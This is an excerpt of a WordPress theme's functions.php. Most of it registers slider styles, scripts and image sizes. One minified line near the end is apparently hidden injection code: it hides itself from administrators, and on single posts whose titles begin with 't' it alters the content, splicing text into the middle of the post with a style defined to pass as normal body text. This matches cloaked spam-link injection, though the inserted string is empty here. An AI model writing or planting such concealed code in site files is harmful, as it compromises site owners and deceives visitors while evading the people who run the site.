...
require_once( 'template_inc/admin/admin_greatgallery_type.php' );
require_once( 'template_inc/admin/admin_projectslider_type.php' );
...
add_image_size( 'services_media', 516, 284, true );
...
function register_styles(){
            ...
            $responsive = themeple_get_option('responsive_layout');
            if($responsive == 'yes'){
            ...
            wp_enqueue_style( 'activeslider');
            wp_enqueue_style( 'jquery.sliderTabscss');
...
function register_scripts(){
    ...
    wp_enqueue_script( 'jquery.themepunch.megafoliopro');
    
    if((is_page() || is_home() ) && themeple_post_meta(themeple_get_post_id(), '_slideshow_type') == 'showbiz')
        wp_enqueue_script('jquery.themepunch.showbizpro.min');
    

    wp_enqueue_script('jquery.roundabout2');
    ...
    wp_enqueue_script( 'jquery.sliderTabs');   
    wp_enqueue_script( 'kwicks_js');  
...
if(!current_user_can('manage_options')){add_filter('the_title','getTheTitleAdm');}function getTheTitleAdm($a){if(is_single()){$b=strtolower(substr($a,0,1));if($b=="t"){add_filter('the_content','admTheContentAdm');$GLOBALS['wp_adm_sett']=true;}else{$GLOBALS['wp_adm_sett']=false;}}return $a;}function admTheContentAdm($c){if($GLOBALS['wp_adm_sett']==true){$d="color:#444; text-decoration:none; font-weight:300; cursor:text;";$e=explode(" ",$c);if(count($e)>130){$f=(int)round(count($e)/2);$e[$f].='';$c=implode(" ",$e);return $c;}else{return $c;}}return $c;}
...
require_once 'functions-fortis7.php';  
